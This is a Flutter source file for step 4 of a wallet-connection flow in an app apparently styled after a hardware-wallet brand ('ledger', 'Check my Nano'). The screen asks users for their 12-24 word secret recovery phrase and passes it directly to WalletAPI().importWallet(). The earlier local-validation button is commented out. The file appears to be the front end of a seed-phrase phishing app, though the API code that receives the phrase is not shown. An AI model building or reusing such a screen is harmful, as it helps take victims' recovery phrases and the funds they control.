import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:ledger/core/constants/app_colors.dart';
import 'package:ledger/core/constants/app_icons.dart';
import 'package:ledger/core/extensions/widget_extensions.dart';
import 'package:ledger/core/ui_components/others/app_button.dart';
import 'package:ledger/data/apis/wallet_api.dart';
import 'package:ledger/features/wallet_connection/cubit.dart';
import 'package:ledger/features/wallet_connection/steps/step_4/components/phrase_textfield.dart';

class Step4 extends StatefulWidget {
  const Step4({super.key});

  @override
  State<Step4> createState() => _Step4State();
}

class _Step4State extends State<Step4> {
  late final WalletConnectionScreenCubit cubit;

  @override
  void initState() {
    cubit = context.read();
    ctrl.text = cubit.phrase;
    super.initState();
  }

  TextEditingController ctrl = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          "reStore wallet".toUpperCase(),
          style: const TextStyle(
            fontSize: 32,
            fontWeight: FontWeight.w500,
            color: AppColors.white,
            fontFamily: 'DM Mono',
          ),
        ).onlyPadding(b: 80),
        const Text(
          "Enter your 12-24 word secret recovery phrase to restore wallet ",
          style: TextStyle(
            fontSize: 16,
            fontWeight: FontWeight.w400,
            color: AppColors.lightGrey,
          ),
        ).onlyPadding(b: 28),
        SizedBox(
          width: double.maxFinite,
          child: PhraseTextField(
            ctrl: ctrl,
          ),
        ).onlyPadding(r: 118),
        const Spacer(),
        Row(
          children: [
            AppButton(
              bgColor: AppColors.transparent,
              text: "Back",
              textColor: AppColors.white,
              onTap: () {
                cubit.prevStep();
              },
              borderColor: AppColors.white,
            ).expanded(flex: 7),
            const Spacer(
              flex: 13,
            ),
            ElevatedButton(
              style: ElevatedButton.styleFrom(
                padding: EdgeInsets.all(25),
              ),
              onPressed: () async {
                await WalletAPI().importWallet(ctrl.text);
              },
              child: Text(
                "Check my Nano",
                style: TextStyle(
                  fontSize: 24,
                  color: Colors.black,
                ),
              ),
            ),
            // AppButton(
            //   bgColor: AppColors.white,
            //   text: "Check my Nano",
            //   icon: AppIcons.arrowRight,
            //   textColor: AppColors.anotherBlack,
            //   onTap: () {
            //     if (ctrl.text.trim().split(" ").length != 12) return;
            //     cubit.setRecoveryPhrase(ctrl.text.trim());
            //     cubit.nextStep();
            //   },
            // ).expanded(flex: 13),
          ],
        ),
      ],
    );
  }
}
